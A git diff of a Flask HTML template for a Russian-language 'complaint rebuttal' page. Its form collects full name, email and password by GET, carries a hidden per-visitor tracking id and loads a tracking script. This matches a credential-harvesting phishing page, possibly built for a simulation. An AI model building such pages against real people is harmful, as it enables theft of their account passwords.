@@ -5,7 +5,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Опровержение жалобы</title>
-    <link rel="stylesheet" href="D:\April\tracking_project\static\css\style_6.1.css" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_6.1.css') }}">
+
 </head>
 
 <body>
@@ -18,15 +19,16 @@
                 <p>Заполните данные ниже</p>
             </div>
 
-            <form>
+            <form action="/site_6.1" method="get">
+                <input type="hidden" name="id" value="{{ request.args.get('id') }}">
                 <label for="fio">ФИО</label>
-                <input type="text" id="fio" name="fio" placeholder="Иванов Иван Иванович" required />
+                <input class="фио" type="text" id="fio" name="fio" placeholder="Иванов Иван Иванович" required />
 
                 <label for="email">Почта</label>
-                <input type="email" id="email" name="email" placeholder="example@mail.ru" required />
+                <input class="почта" type="email" id="email" name="email" placeholder="example@mail.ru" required />
 
                 <label for="password">Пароль</label>
-                <input type="password" id="password" name="password" placeholder="Введите пароль" required />
+                <input class="пароль" type="password" id="password" name="password" placeholder="Введите пароль" required />
 
                 <label for="description">Краткое описание произошедшего</label>
                 <textarea id="description" name="description" rows="4" placeholder="Опишите ситуацию..."
@@ -36,6 +38,7 @@
             </form>
         </div>
     </div>
+    <script src="{{ url_for('static', filename='js/track_example_2.js') }}"></script>
 </body>
 
 </html>
